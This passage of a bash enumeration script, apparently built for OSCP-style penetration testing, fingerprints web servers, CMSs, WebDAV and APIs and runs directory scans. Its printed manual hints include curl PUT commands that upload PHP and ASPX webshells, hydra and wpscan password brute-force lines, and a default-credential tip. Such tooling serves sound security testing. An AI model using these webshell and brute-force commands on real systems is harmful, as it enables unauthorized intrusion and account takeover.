#!/usr/bin/env bash
# =============================================================================
#  wrappers/web_enum.sh — Web Enumeration Wrapper
#  Tools: curl, whatweb, feroxbuster, gobuster, nikto, wpscan, ffuf, sslscan
#
#  OSCP compliance:
#    - Safe enumeration only (no exploit payloads)
#    - No LFI/RFI automated fuzzing (manual hint provided instead)
#    - nuclei with exploit templates → manual hint only
#    - wpscan in enumerate-only mode (no brute force)
#
#  Usage:
#    bash wrappers/web_enum.sh --target <IP> --output-dir <DIR> \
#         --port <PORT> [--proto http|https] [--domain <DOMAIN>]
#
#  Output directory: <DIR>/web/
# =============================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; WHITE='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'
# Disable ANSI colors when stdout is not a TTY (e.g. piped to Python)
[ -t 1 ] || { RED=""; GREEN=""; YELLOW=""; CYAN=""; WHITE=""; NC=""; BOLD=""; }

info() { echo -e "  ${CYAN}[*]${NC} $*"; }
ok()   { echo -e "  ${GREEN}[+]${NC} $*"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $*"; }
err()  { echo -e "  ${RED}[-]${NC} $*"; }
cmd()  { echo -e "  ${YELLOW}[CMD]${NC} $*"; }
hint() { echo -e "\n  ${YELLOW}[MANUAL]${NC} $*\n"; }
skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1 not installed — skipping."; }

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
TARGET=""; OUTPUT_DIR=""; PORT="80"; PROTO="http"; DOMAIN=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)     TARGET="$2";     shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        --port)       PORT="$2";       shift 2 ;;
        --proto)      PROTO="$2";      shift 2 ;;
        --domain)     DOMAIN="$2";     shift 2 ;;
        *) err "Unknown argument: $1"; exit 1 ;;
    esac
done

if [[ -z "$TARGET" || -z "$OUTPUT_DIR" ]]; then
    err "Usage: $0 --target <IP> --output-dir <DIR> --port <PORT> [--proto http|https] [--domain <DOMAIN>]"
    exit 1
fi

# Infer protocol from port if not explicitly set
if [[ "$PROTO" == "http" && ( "$PORT" == "443" || "$PORT" == "8443" || "$PORT" == "9443" ) ]]; then
    PROTO="https"
fi

# Build base URL
BASE_URL="${PROTO}://${TARGET}"
[[ "$PORT" != "80" && "$PORT" != "443" ]] && BASE_URL="${BASE_URL}:${PORT}"

# File suffix for multi-port runs
SUFFIX=""
[[ "$PORT" != "80" && "$PORT" != "443" ]] && SUFFIX="_port${PORT}"

WEB_DIR="${OUTPUT_DIR}/web"
mkdir -p "$WEB_DIR"

# ---------------------------------------------------------------------------
# TLS SAN extraction (HTTPS only) — runs before any enumeration so discovered
# hostnames are available for vhost and gobuster scans.
# ---------------------------------------------------------------------------
if [[ "$PROTO" == "https" ]]; then
    info "[TLS] Extracting Subject Alternative Names from certificate"
    SAN_OUT="${WEB_DIR}/tls_sans${SUFFIX}.txt"
    cmd "openssl s_client -showcerts -connect ${TARGET}:${PORT} (SAN extraction)"
    openssl s_client -showcerts -connect "${TARGET}:${PORT}" \
        </dev/null 2>/dev/null \
        | openssl x509 -noout -text 2>/dev/null \
        | grep -i 'DNS:' \
        | sed 's/[[:space:]]//g; s/DNS://g; s/,/\n/g' \
        | sort -u \
        | tee "$SAN_OUT" || true

    SAN_COUNT=$(wc -l < "$SAN_OUT" 2>/dev/null || echo 0)
    if [[ "$SAN_COUNT" -gt 0 ]]; then
        ok "TLS SANs found (${SAN_COUNT}): $(tr '\n' ' ' < "$SAN_OUT")"
        # Append non-IP SANs to discovered_hostnames for vhost follow-up
        grep -vP '^\d+\.\d+\.\d+\.\d+$' "$SAN_OUT" 2>/dev/null \
            >> "${WEB_DIR}/discovered_hostnames.txt" || true
        sort -u "${WEB_DIR}/discovered_hostnames.txt" \
            -o "${WEB_DIR}/discovered_hostnames.txt" 2>/dev/null || true
        hint "Add discovered SAN hostnames to /etc/hosts and re-scan:
    while IFS= read -r h; do echo \"${TARGET}  \$h\"; done < ${SAN_OUT} | sudo tee -a /etc/hosts"
    else
        info "No SANs extracted (self-signed or openssl not available)."
    fi
    echo ""
fi

# Wordlist resolution (tiered fallback)
WL_QUICK=""
WL_MEDIUM=""
WL_VHOST=""

for f in \
    "/usr/share/wordlists/dirb/common.txt" \
    "/usr/share/seclists/Discovery/Web-Content/common.txt"; do
    [[ -f "$f" ]] && WL_QUICK="$f" && break
done

for f in \
    "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" \
    "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" \
    "/usr/share/wordlists/content_discovery_all.txt"; do
    [[ -f "$f" ]] && WL_MEDIUM="$f" && break
done

for f in \
    "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" \
    "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"; do
    [[ -f "$f" ]] && WL_VHOST="$f" && break
done

echo ""
echo -e "  ${BOLD}============================================================${NC}"
echo -e "  ${BOLD}  WEB ENUM — ${BASE_URL}${NC}"
[[ -n "$DOMAIN" ]] && echo -e "  ${BOLD}  Domain : ${DOMAIN}${NC}"
echo -e "  ${BOLD}============================================================${NC}"
echo ""

# ===========================================================================
# Per-step interrupt handler
#
# Ctrl+C (first)  → kills the currently running tool (feroxbuster, nikto…),
#                   prints a skip notice, and continues to the next step.
# Ctrl+C (second, within SKIP_ABORT_WINDOW seconds) → exits the script so
#                   runner.py's second-interrupt logic can abort the module.
#
# Implementation:
#   bash defers SIGINT while a foreground child is running.  When the child
#   exits (killed by the same SIGINT that runner.py forwarded), bash runs
#   _sigint_step().  STEP_SKIPPED is checked/reset at the start of each step
#   that wants to announce it was skipped.
# ===========================================================================
STEP_SKIPPED=false
_LAST_SIGINT_TS=0
SKIP_ABORT_WINDOW=5

_sigint_step() {
    local now
    now=$(date +%s)
    if (( now - _LAST_SIGINT_TS < SKIP_ABORT_WINDOW )); then
        # Second Ctrl+C within the abort window — exit so runner.py kills group
        warn "Second Ctrl+C — aborting web enumeration for ${TARGET}:${PORT}"
        exit 130
    fi
    _LAST_SIGINT_TS=$now
    STEP_SKIPPED=true
    echo ""
    warn "⚡ Step interrupted — continuing to next step"
    warn "   (press Ctrl+C again within ${SKIP_ABORT_WINDOW}s to abort entire module)"
    echo ""
}
trap '_sigint_step' INT

# ===========================================================================
# 0 — Instant fingerprint (3s timeout — always runs before Ctrl+C is possible)
#     Identifies the application BEFORE feroxbuster so early aborts still have
#     useful data.  Written to quick_fingerprint<SUFFIX>.txt immediately.
# ===========================================================================
QUICK_OUT="${WEB_DIR}/quick_fingerprint${SUFFIX}.txt"
info "[0/10] Quick port fingerprint (3s)"
# Single HEAD + body grab with aggressive timeout — just enough to see the banner
RAW_HEADERS=$(curl -ksILm 3 --max-redirs 2 "$BASE_URL" 2>/dev/null || true)
echo "$RAW_HEADERS" > "$QUICK_OUT"

QF_SERVER=$(echo "$RAW_HEADERS"  | grep -i '^Server:'       | tail -1 | sed 's/^[Ss]erver:[[:space:]]*//' | tr -d '\r' || true)
QF_POWERED=$(echo "$RAW_HEADERS" | grep -i '^X-Powered-By:' | tail -1 | sed 's/^[Xx]-[Pp]owered-[Bb]y:[[:space:]]*//' | tr -d '\r' || true)
QF_CTYPE=$(echo "$RAW_HEADERS"   | grep -i '^Content-Type:' | tail -1 | sed 's/^[Cc]ontent-[Tt]ype:[[:space:]]*//' | tr -d '\r' || true)
QF_CODE=$(echo "$RAW_HEADERS"    | grep -oP 'HTTP/[\d.]+ \K\d{3}' | tail -1 || true)

[[ -n "$QF_CODE"   ]] && ok   "HTTP Status   : ${WHITE}${QF_CODE}${NC}"   || true
[[ -n "$QF_SERVER" ]] && ok   "Server        : ${WHITE}${QF_SERVER}${NC}"  || true
[[ -n "$QF_POWERED" ]] && ok  "X-Powered-By  : ${WHITE}${QF_POWERED}${NC}" || true
[[ -n "$QF_CTYPE"  ]] && info "Content-Type  : ${QF_CTYPE}"                || true

# Detect common applications from headers alone (runs in < 1s)
if echo "$QF_SERVER $QF_POWERED $RAW_HEADERS" | grep -qiE 'tomcat|catalina|coyote'; then
    warn "Apache Tomcat detected on port ${PORT} — check /manager/html"
    echo "APP_HINT=tomcat" >> "$QUICK_OUT"
elif echo "$QF_SERVER $QF_POWERED $RAW_HEADERS" | grep -qiE 'jenkins'; then
    warn "Jenkins detected on port ${PORT} — check /login (default: admin:admin)"
    echo "APP_HINT=jenkins" >> "$QUICK_OUT"
elif echo "$QF_SERVER $QF_POWERED $RAW_HEADERS" | grep -qiE 'jboss|wildfly'; then
    warn "JBoss/WildFly detected on port ${PORT} — check /jmx-console"
    echo "APP_HINT=jboss" >> "$QUICK_OUT"
elif echo "$QF_SERVER $QF_POWERED $RAW_HEADERS" | grep -qiE 'weblogic'; then
    warn "WebLogic detected on port ${PORT} — check /console"
    echo "APP_HINT=weblogic" >> "$QUICK_OUT"
elif echo "$QF_SERVER $QF_POWERED $RAW_HEADERS" | grep -qiE 'glassfish'; then
    warn "GlassFish detected on port ${PORT} — check /common/logon/logon.jsf"
    echo "APP_HINT=glassfish" >> "$QUICK_OUT"
elif echo "$QF_SERVER $QF_POWERED" | grep -qiE 'php'; then
    info "PHP detected — will prioritise .php extensions in directory scan"
    echo "APP_HINT=php" >> "$QUICK_OUT"
fi

# Detect authentication requirement
if echo "$RAW_HEADERS" | grep -qiE 'WWW-Authenticate:|401 Unauthorized'; then
    warn "HTTP Basic Auth required on port ${PORT}"
    hint "HTTP Basic Auth — brute force (with known users):
  hydra -L ${OUTPUT_DIR}/users.txt -P /usr/share/wordlists/rockyou.txt ${TARGET} http-get / -s ${PORT}"
fi

echo ""

# ===========================================================================
# 1 — HTTP Headers + Quick reconnaissance (curl)
# ===========================================================================
info "[1/10] HTTP headers and initial page info (curl)"

HEADERS_OUT="${WEB_DIR}/headers${SUFFIX}.txt"
cmd "curl -ksI --max-time 10 $BASE_URL"
curl -ksI --max-time 10 "$BASE_URL" 2>/dev/null | tee "$HEADERS_OUT" || true

# Grab robots.txt and sitemap.xml
cmd "curl -sk --max-time 10 $BASE_URL/robots.txt"
curl -sk --max-time 10 "${BASE_URL}/robots.txt" 2>/dev/null \
    > "${WEB_DIR}/robots${SUFFIX}.txt" || true

if [[ -s "${WEB_DIR}/robots${SUFFIX}.txt" ]] && \
   ! grep -qi "404\|not found" "${WEB_DIR}/robots${SUFFIX}.txt" 2>/dev/null; then
    ok "robots.txt found — check for disallowed paths:"
    grep -i "Disallow:" "${WEB_DIR}/robots${SUFFIX}.txt" 2>/dev/null | head -10 || true
fi

curl -sk --max-time 10 "${BASE_URL}/sitemap.xml" 2>/dev/null \
    > "${WEB_DIR}/sitemap${SUFFIX}.xml" || true

# Redirect / hostname detection
REDIR_URL=$(curl -ksI -o /dev/null -w '%{redirect_url}' --max-time 5 "$BASE_URL" 2>/dev/null || true)
if [[ -n "$REDIR_URL" ]]; then
    REDIR_HOST=$(echo "$REDIR_URL" | sed -E 's|https?://([^/:]+).*|\1|')
    if [[ "$REDIR_HOST" != "$TARGET" ]] && ! echo "$REDIR_HOST" | grep -qP '^\d+\.\d+\.\d+\.\d+$'; then
        ok "Redirect detected: ${WHITE}${BASE_URL}${NC} → ${YELLOW}${REDIR_URL}${NC}"
        ok "Hostname: ${BOLD}${REDIR_HOST}${NC}"
        echo "$REDIR_HOST" >> "${WEB_DIR}/discovered_hostnames.txt"
        hint "Add to /etc/hosts if not already present:
    echo '${TARGET}    ${REDIR_HOST}' | sudo tee -a /etc/hosts"
    fi
fi
echo ""

# ===========================================================================
# 1.5 — WebDAV Detection
# ===========================================================================
WEBDAV_OUT="${WEB_DIR}/webdav${SUFFIX}.txt"
info "[1.5/10] WebDAV detection"

# Check OPTIONS response for DAV header
WEBDAV_HEADER=$(curl -sk --max-time 8 -X OPTIONS "$BASE_URL" 2>/dev/null \
    | grep -i '^DAV:' || true)
WEBDAV_ALLOW=$(curl -skI --max-time 8 -X OPTIONS "$BASE_URL" 2>/dev/null \
    | grep -i '^Allow:' | tr -d '\r' || true)

if [[ -n "$WEBDAV_HEADER" ]]; then
    warn "WebDAV enabled! DAV header: ${WHITE}${WEBDAV_HEADER}${NC}"
    echo "$WEBDAV_ALLOW" | tee "$WEBDAV_OUT"
    # Check if PUT is allowed
    if echo "$WEBDAV_ALLOW" | grep -qi 'PUT'; then
        warn "PUT method allowed — potential file upload vector!"
        echo "PUT_ALLOWED=yes" >> "$WEBDAV_OUT"
    fi
    # Try davtest if available
    if command -v davtest &>/dev/null; then
        cmd "davtest -url $BASE_URL"
        davtest -url "$BASE_URL" 2>&1 | tee -a "$WEBDAV_OUT" || true
        ok "davtest done → ${WHITE}${WEBDAV_OUT}${NC}"
    else
        skip "davtest"
        hint "WebDAV upload test (run manually):
    davtest -url ${BASE_URL}
    cadaver ${BASE_URL}
    # Upload webshell:
    curl -sk -X PUT ${BASE_URL}/cmd.php -d '<?php system(\$_GET[\"cmd\"]);?>'
    curl -sk -X PUT ${BASE_URL}/cmd.aspx --data-binary @/usr/share/webshells/aspx/cmdasp.aspx"
    fi
else
    info "WebDAV not detected on ${BASE_URL}"
    echo "WebDAV: not detected" > "$WEBDAV_OUT"
fi
echo ""

# ===========================================================================
# 2 — WhatWeb (technology fingerprinting)
# ===========================================================================
info "[2/10] WhatWeb — technology fingerprinting"
WHATWEB_OUT="${WEB_DIR}/whatweb${SUFFIX}.txt"

if command -v whatweb &>/dev/null; then
    cmd "whatweb --no-errors --color=NEVER -a 3 $BASE_URL"
    whatweb --no-errors --color=NEVER -a 3 "$BASE_URL" 2>&1 | tee "$WHATWEB_OUT" || true
else
    skip "whatweb"
    echo "# whatweb not installed" > "$WHATWEB_OUT"
fi

# ---------------------------------------------------------------------------
# Dynamic extension list — hybrid of technology fingerprint + universal loot.
#
# BASE_EXTS: universal backup/loot extensions, ALWAYS included regardless of
#            server technology (backup files exist on every stack).
# TECH_EXTS: technology-specific extensions, determined by WhatWeb fingerprint.
#            Default covers PHP/ASP (most common OSCP targets).
# ENUM_EXTS: the combined final list passed to gobuster and feroxbuster.
# ---------------------------------------------------------------------------
BASE_EXTS="txt,bak,old,zip,sql,tar.gz"   # universal loot — always scan these
TECH_EXTS="php,html,asp,aspx,xml"        # default: assume PHP/ASP until proven otherwise

if [[ -s "$WHATWEB_OUT" ]]; then
    # Java / Tomcat / Spring / JSP — replace default PHP/ASP assumption
    if grep -qiE 'tomcat|java|jsp|spring|jboss|websphere|glassfish' "$WHATWEB_OUT" 2>/dev/null; then
        TECH_EXTS="jsp,do,action,jsf,jspx,html,xml"
        ok "WhatWeb: Java/Tomcat stack detected — TECH_EXTS set to .jsp,.do,.action"
    fi
    # Python / Flask / Django / WSGI
    if grep -qiE 'python|flask|django|wsgi|gunicorn|pylons|tornado' "$WHATWEB_OUT" 2>/dev/null; then
        TECH_EXTS="${TECH_EXTS},py"
        ok "WhatWeb: Python stack detected — adding .py"
    fi
    # Ruby / Rails / Sinatra
    if grep -qiE 'ruby|rails|sinatra|passenger|rack' "$WHATWEB_OUT" 2>/dev/null; then
        TECH_EXTS="${TECH_EXTS},rb"
        ok "WhatWeb: Ruby stack detected — adding .rb"
    fi
    # ColdFusion
    if grep -qiE 'coldfusion|cfml' "$WHATWEB_OUT" 2>/dev/null; then
        TECH_EXTS="${TECH_EXTS},cfm,cfml,cfc"
        ok "WhatWeb: ColdFusion detected — adding .cfm,.cfml,.cfc"
    fi
    # Perl / CGI
    if grep -qiE 'perl|cgi-bin' "$WHATWEB_OUT" 2>/dev/null; then
        TECH_EXTS="${TECH_EXTS},pl,cgi"
        ok "WhatWeb: Perl/CGI detected — adding .pl,.cgi"
    fi
fi

# Always append universal loot extensions after technology-specific ones
ENUM_EXTS="${TECH_EXTS},${BASE_EXTS}"
ok "Extension list → TECH: ${WHITE}${TECH_EXTS}${NC} | LOOT: ${WHITE}${BASE_EXTS}${NC}"

echo ""

# ===========================================================================
# 3 — CMS Detection + wpscan (WordPress only)
# ===========================================================================
info "[3/10] CMS detection"
CMS_DETECTED=""

# Fetch page body for CMS fingerprinting
PAGE_BODY=$(curl -skL --max-time 10 "$BASE_URL" 2>/dev/null || true)

if echo "$PAGE_BODY" | grep -qiE 'wp-content|wp-includes|wp-json|wordpress' || \
   grep -qi "wordpress" "$WHATWEB_OUT" 2>/dev/null; then
    CMS_DETECTED="WordPress"
    ok "CMS detected: ${RED}WordPress${NC}"
elif echo "$PAGE_BODY" | grep -qiE 'joomla|com_content|/components/|/administrator/' || \
     grep -qi "joomla" "$WHATWEB_OUT" 2>/dev/null; then
    CMS_DETECTED="Joomla"
    ok "CMS detected: ${RED}Joomla${NC}"
elif echo "$PAGE_BODY" | grep -qiE 'drupal|sites/default|/core/misc/drupal' || \
     grep -qi "drupal" "$WHATWEB_OUT" 2>/dev/null; then
    CMS_DETECTED="Drupal"
    ok "CMS detected: ${RED}Drupal${NC}"
else
    info "No known CMS fingerprinted."
fi

if [[ "$CMS_DETECTED" == "WordPress" ]]; then
    if command -v wpscan &>/dev/null; then
        info "Launching wpscan (plugin/theme/user enumeration — no brute force)"
        WPSCAN_OUT="${WEB_DIR}/wpscan${SUFFIX}.txt"
        cmd "wpscan --url $BASE_URL --enumerate vp,vt,u --plugins-detection aggressive --no-banner"
        wpscan --url "$BASE_URL" \
            --enumerate vp,vt,u \
            --plugins-detection aggressive \
            --no-banner \
            -o "$WPSCAN_OUT" 2>&1 | tee "$WPSCAN_OUT" || true
    else
        skip "wpscan"
        hint "WordPress brute force (run manually if authorized):
    wpscan --url ${BASE_URL} --enumerate u,vp,vt --plugins-detection aggressive
    wpscan --url ${BASE_URL} -U admin -P /usr/share/wordlists/rockyou.txt"
    fi

elif [[ "$CMS_DETECTED" == "Joomla" ]]; then
    hint "Joomla — run manually:
    droopescan scan joomla --url ${BASE_URL}
    curl '${BASE_URL}/api/index.php/v1/config/application?public=true'
    curl '${BASE_URL}/api/v1/users?public=true'"

elif [[ "$CMS_DETECTED" == "Drupal" ]]; then
    hint "Drupal — run manually:
    droopescan scan drupal -u ${BASE_URL}
    searchsploit drupal"
fi
echo ""

# ===========================================================================
# 3.5 — API Endpoint Detection (REST/Swagger/OpenAPI/GraphQL)
# ===========================================================================
API_OUT="${WEB_DIR}/api_discovery${SUFFIX}.txt"
info "[3.5/10] API endpoint discovery (Swagger/OpenAPI/GraphQL)"
> "$API_OUT"

API_ENDPOINTS=(
    "/api" "/api/v1" "/api/v2" "/api/v3"
    "/swagger.json" "/swagger.yaml" "/swagger-ui.html" "/swagger-ui/"
    "/openapi.json" "/openapi.yaml"
    "/api-docs" "/api-docs/swagger.json"
    "/v1" "/v2" "/v3"
    "/graphql" "/graphiql" "/gql" "/query"
    "/.well-known/openapi"
    "/rest" "/rest/api" "/rest/api/2"     # Jira/Confluence
    "/wp-json/wp/v2"                       # WordPress REST API
)

API_FOUND=()
for ep in "${API_ENDPOINTS[@]}"; do
    RESP_CODE=$(curl -sk --max-time 5 -o /dev/null -w '%{http_code}' \
        "${BASE_URL}${ep}" 2>/dev/null || true)
    if [[ "$RESP_CODE" =~ ^(200|201|301|302|401|403)$ ]]; then
        ok "API endpoint found: ${WHITE}${ep}${NC} (HTTP ${RESP_CODE})"
        echo "${ep} [${RESP_CODE}]" >> "$API_OUT"
        API_FOUND+=("$ep")
    fi
done

# GraphQL introspection (only if /graphql responded)
for ep in "${API_FOUND[@]}"; do
    if echo "$ep" | grep -qiE 'graphql|gql|query'; then
        info "Attempting GraphQL introspection on ${ep}..."
        GQL_RESP=$(curl -sk --max-time 10 \
            -X POST "${BASE_URL}${ep}" \
            -H 'Content-Type: application/json' \
            -d '{"query":"{__schema{types{name}}}"}' 2>/dev/null || true)
        if echo "$GQL_RESP" | grep -qi '"__schema"'; then
            warn "GraphQL introspection ENABLED on ${BASE_URL}${ep}"
            echo "GRAPHQL_INTROSPECTION=enabled" >> "$API_OUT"
            echo "$GQL_RESP" >> "$API_OUT"
            hint "GraphQL enumeration:
    # Full schema dump:
    graphw00f -d -t ${BASE_URL}${ep}
    # Or manually:
    curl -sk -X POST '${BASE_URL}${ep}' -H 'Content-Type: application/json' \\
         -d '{\"query\":\"{__schema{queryType{name}mutationType{name}types{name kind}}}\"}'
    # Try graphql-cop for vulnerabilities:
    graphql-cop -t ${BASE_URL}${ep}"
        fi || true
    fi
done

# Swagger/OpenAPI — download and extract endpoints if found
for ep in "${API_FOUND[@]}"; do
    if echo "$ep" | grep -qiE 'swagger|openapi|api-docs'; then
        CONTENT_TYPE=$(curl -sk --max-time 5 -I "${BASE_URL}${ep}" 2>/dev/null \
            | grep -i '^Content-Type:' | tr -d '\r' || true)
        if echo "$CONTENT_TYPE" | grep -qiE 'json|yaml|html'; then
            info "Downloading API spec from ${ep}..."
            curl -sk --max-time 15 "${BASE_URL}${ep}" 2>/dev/null \
                > "${API_OUT%.txt}_spec${SUFFIX}.json" || true
            ENDPOINT_COUNT=$(grep -oP '"(get|post|put|delete|patch)"' \
                "${API_OUT%.txt}_spec${SUFFIX}.json" 2>/dev/null | wc -l || echo "?")
            ok "API spec saved (${ENDPOINT_COUNT} methods found) → ${API_OUT%.txt}_spec${SUFFIX}.json"
        fi || true
    fi
done

if [[ ${#API_FOUND[@]} -eq 0 ]]; then
    info "No API endpoints detected."
fi
echo ""

# ===========================================================================
# 4 — Gobuster dir — QUICK scan (common wordlist)
# ===========================================================================
info "[4/10] Gobuster — quick directory scan (common.txt)"
GB_QUICK_OUT="${WEB_DIR}/gobuster${SUFFIX}.txt"

if command -v gobuster &>/dev/null; then
    if [[ -n "$WL_QUICK" ]]; then
        cmd "gobuster dir -u $BASE_URL -w $WL_QUICK -x $ENUM_EXTS -t 50 --no-error -k -b 403,404"
        gobuster dir \
            -u "$BASE_URL" \
            -w "$WL_QUICK" \
            -x "$ENUM_EXTS" \
            -t 50 --no-error -k \
            --exclude-length 0 \
            -b "403,404" \
            -o "$GB_QUICK_OUT" 2>&1 | tee "${GB_QUICK_OUT}.log" || true
        ok "Gobuster quick done → ${WHITE}${GB_QUICK_OUT}${NC}"
    else
        warn "No quick wordlist found. Install dirb or seclists."
        touch "$GB_QUICK_OUT"
    fi
else
    skip "gobuster"
    touch "$GB_QUICK_OUT"
fi
echo ""

# ===========================================================================
# 5 — Dynamic CGI/Script Sniper
#
# Runs BEFORE the slow recursive scan so Ctrl+C on feroxbuster never loses
# CGI results.  Parses gobuster output + always scans "/" as baseline.
# Feroxbuster output ($FEROX_OUT) is checked only if it already exists
# (it won't on first pass — that's fine, "/" covers the common cases).
#
# Wordlist priority:
#   1. seclists CGIs.txt  (purpose-built, ~3 k entries)
#   2. dirb common.txt    (fallback — broader but still fast)
# ===========================================================================
info "[5/10] Dynamic CGI/Script Sniper — hunting scripts in discovered directories"

CGI_SNIPER_OUT="${WEB_DIR}/dynamic_cgi_sniper${SUFFIX}.txt"
> "$CGI_SNIPER_OUT"   # reset output file

# Declare early so the feroxbuster guard below doesn't hit unbound-var
FEROX_OUT="${WEB_DIR}/feroxbuster${SUFFIX}.txt"

WL_CGI=""
for f in \
    "/usr/share/seclists/Discovery/Web-Content/CGIs.txt" \
    "/usr/share/wordlists/dirb/common.txt"; do
    [[ -f "$f" ]] && WL_CGI="$f" && break
done

if [[ -z "$WL_CGI" ]]; then
    warn "No CGI wordlist found — skipping sniper (install seclists or dirb)."
elif ! command -v feroxbuster &>/dev/null; then
    warn "feroxbuster not installed — skipping CGI sniper."
else
    # ------------------------------------------------------------------
    # Collect unique directory paths from scan output files.
    # Gobuster format  : "/path/   (Status: 200)"
    # Feroxbuster format: "200 GET ... http://host/path/"
    # We keep the BASE_URL-relative path only and always include "/" as
    # a baseline (catches /cgi-bin/ on a server that wasn't already found).
    # ------------------------------------------------------------------
    {
        # Gobuster: paths ending with / and status 200/301/403
        if [[ -s "$GB_QUICK_OUT" ]]; then
            grep -E '\(Status: (200|301|403)\)' "$GB_QUICK_OUT" 2>/dev/null \
                | grep -oP '^/[^\s(]+/' || true
        fi

        # Feroxbuster: strip host prefix from URLs ending with /
        # (will be empty at step 5 — populated if CGI sniper re-runs later)
        if [[ -s "$FEROX_OUT" ]]; then
            grep -oP 'https?://\S+/' "$FEROX_OUT" 2>/dev/null \
                | sed "s|${BASE_URL}||g" \
                | grep -oP '^/\S*' || true
        fi

        # Always scan root (catches /cgi-bin/ if missed by earlier scans)
        echo "/"
    } | sort -u | grep -v '^$' > "${WEB_DIR}/.sniper_dirs${SUFFIX}.tmp"

    DIR_COUNT=$(wc -l < "${WEB_DIR}/.sniper_dirs${SUFFIX}.tmp" || echo 0)
    ok "Directories to snipe: ${WHITE}${DIR_COUNT}${NC}"

    while IFS= read -r dir_path; do
        [[ -z "$dir_path" ]] && continue
        DIR_URL="${BASE_URL}${dir_path}"
        info "  Sniping: ${WHITE}${DIR_URL}${NC}"
        cmd "feroxbuster -u ${DIR_URL} -w ${WL_CGI} -x cgi,sh,pl -t 50 --status-codes 200 -q"
        feroxbuster \
            -u "$DIR_URL" \
            -w "$WL_CGI" \
            -x "cgi,sh,pl" \
            -t 50 -k -q \
            --status-codes 200 \
            --no-state \
            2>/dev/null | tee -a "$CGI_SNIPER_OUT" || true
    done < "${WEB_DIR}/.sniper_dirs${SUFFIX}.tmp"

    rm -f "${WEB_DIR}/.sniper_dirs${SUFFIX}.tmp"

    if [[ -s "$CGI_SNIPER_OUT" ]]; then
        # Count only actual executable scripts (.cgi .sh .pl) — not HTML/images
        SCRIPT_COUNT=$(grep -ciP '\.(cgi|sh|pl)(\?|$| )' "$CGI_SNIPER_OUT" 2>/dev/null || echo 0)
        if [[ "$SCRIPT_COUNT" -gt 0 ]]; then
            ok "${RED}⚠  CGI SNIPER: ${SCRIPT_COUNT} executable script(s) found → ${CGI_SNIPER_OUT}${NC}"
        else
            info "CGI sniper: no .cgi/.sh/.pl scripts found (non-script responses filtered)."
        fi
    else
        info "CGI sniper: no executable scripts found in any discovered directory."
    fi
fi
echo ""

# ===========================================================================
# 6 — Nikto (safe web scan)
# Runs BEFORE feroxbuster — fast enough that Ctrl+C on the deep scan won't
# lose nikto results.
# ===========================================================================
info "[6/10] Nikto — web vulnerability scan (max 15 min)"
NIKTO_OUT="${WEB_DIR}/nikto${SUFFIX}.txt"
NIKTO_SSL=""
[[ "$PROTO" == "https" ]] && NIKTO_SSL="-ssl"

if command -v nikto &>/dev/null; then
    cmd "nikto -h $TARGET -port $PORT $NIKTO_SSL -ask no -maxtime 900 -timeout 10"
    nikto -h "$TARGET" -port "$PORT" $NIKTO_SSL \
        -ask no -maxtime 900 -timeout 10 \
        -Format txt -output "$NIKTO_OUT" 2>&1 | tee "${NIKTO_OUT}.log" || true
    # Nikto sometimes appends .txt.txt
    [[ -f "${NIKTO_OUT}.txt" ]] && mv "${NIKTO_OUT}.txt" "$NIKTO_OUT" 2>/dev/null || true
    ok "Nikto done → ${WHITE}${NIKTO_OUT}${NC}"
else
    skip "nikto"
    touch "$NIKTO_OUT"
fi
echo ""

# ===========================================================================
# 7 — Feroxbuster — recursive deep scan (medium wordlist)
# Placed AFTER CGI sniper and Nikto — safe to Ctrl+C without losing results.
# ===========================================================================
info "[7/10] Feroxbuster — recursive deep scan (medium wordlist)"

if command -v feroxbuster &>/dev/null; then
    if [[ -n "$WL_MEDIUM" ]]; then
        cmd "feroxbuster -u $BASE_URL -w $WL_MEDIUM -x $ENUM_EXTS -t 50 -k -q -d 2 --filter-status 403,404,400"
        feroxbuster \
            -u "$BASE_URL" \
            -w "$WL_MEDIUM" \
            -x "$ENUM_EXTS" \
            -t 50 -k -q -d 2 \
            --filter-status 403,404,400 \
            --no-state \
            -o "$FEROX_OUT" < /dev/null 2>&1 | tee "${FEROX_OUT}.log" || true
        ok "Feroxbuster done → ${WHITE}${FEROX_OUT}${NC}"
    else
        warn "No medium wordlist found. Install dirbuster wordlists or seclists."
        touch "$FEROX_OUT"
    fi
elif [[ -n "$WL_MEDIUM" ]] && command -v gobuster &>/dev/null; then
    # Fallback to gobuster deep if feroxbuster not available
    info "Feroxbuster not found — running gobuster with medium wordlist as fallback."
    cmd "gobuster dir -u $BASE_URL -w $WL_MEDIUM -x $ENUM_EXTS -t 50 --no-error -k -b 403,404"
    gobuster dir \
        -u "$BASE_URL" \
        -w "$WL_MEDIUM" \
        -x "$ENUM_EXTS" \
        -t 50 --no-error -k \
        --exclude-length 0 \
        -b "403,404" \
        -o "$FEROX_OUT" 2>&1 | tee "${FEROX_OUT}.log" || true
    ok "Gobuster deep done → ${WHITE}${FEROX_OUT}${NC}"
else
    skip "feroxbuster and gobuster"
    touch "$FEROX_OUT"
fi
echo ""

# ===========================================================================
# 7 — Virtual host fuzzing
# Runs if --domain was passed OR if a hostname was auto-detected from
# TLS SANs / HTTP redirects (both stored in discovered_hostnames.txt)
# ===========================================================================
FFUF_VHOST_OUT="${WEB_DIR}/ffuf_vhost${SUFFIX}.txt"
GOBUSTER_VHOST_OUT="${WEB_DIR}/vhosts${SUFFIX}.txt"

# Auto-detect domain if not explicitly passed
EFFECTIVE_DOMAIN="$DOMAIN"
if [[ -z "$EFFECTIVE_DOMAIN" ]] && [[ -f "${WEB_DIR}/discovered_hostnames.txt" ]]; then
    EFFECTIVE_DOMAIN=$(head -1 "${WEB_DIR}/discovered_hostnames.txt" 2>/dev/null || true)
    [[ -n "$EFFECTIVE_DOMAIN" ]] && info "Auto-detected domain for vhost fuzzing: ${WHITE}${EFFECTIVE_DOMAIN}${NC}" || true
fi

if [[ -n "$EFFECTIVE_DOMAIN" ]]; then
